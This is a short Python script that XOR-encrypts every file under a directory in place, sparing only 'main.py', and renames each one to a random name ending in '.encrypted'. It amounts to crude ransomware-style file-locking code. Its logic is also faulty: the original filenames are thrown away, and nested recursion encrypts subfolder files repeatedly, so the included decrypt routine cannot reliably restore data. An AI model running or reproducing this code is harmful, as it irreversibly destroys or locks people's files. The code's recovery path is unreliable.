import os
import random
import string

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        # Perform binary encryption using XOR operation with the key
        encrypted_data = bytes([byte ^ key for byte in data])

        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
    except PermissionError as e:
        print(f"Permission Denied: {e}. Skipping file: {file_path}")

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        # Perform binary decryption using XOR operation with the key
        decrypted_data = bytes([byte ^ key for byte in data])

        with open(file_path, 'wb') as file:
            file.write(decrypted_data)
    except PermissionError as e:
        print(f"Permission Denied: {e}. Skipping file: {file_path}")

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            if file_name != 'main.py':  # Exclude the main script from being encrypted
                file_path = os.path.join(root, file_name)
                encrypt_file(file_path, key)
                # Rename the file to a random name
                random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                new_file_path = os.path.join(root, f"{random_name}.encrypted")
                os.rename(file_path, new_file_path)

def decrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            if file_name != 'main.py':  # Exclude the main script from being decrypted
                file_path = os.path.join(root, file_name)
                decrypt_file(file_path, key)
                # Rename the file to remove the .encrypted extension
                new_file_path = os.path.splitext(file_path)[0]
                os.rename(file_path, new_file_path)

def recursive_encrypt_start(directory, key):
    encrypt_directory(directory, key)
    for root, dirs, _ in os.walk(directory):
        for dir_name in dirs:
            dir_path = os.path.join(root, dir_name)
            recursive_encrypt_start(dir_path, key)
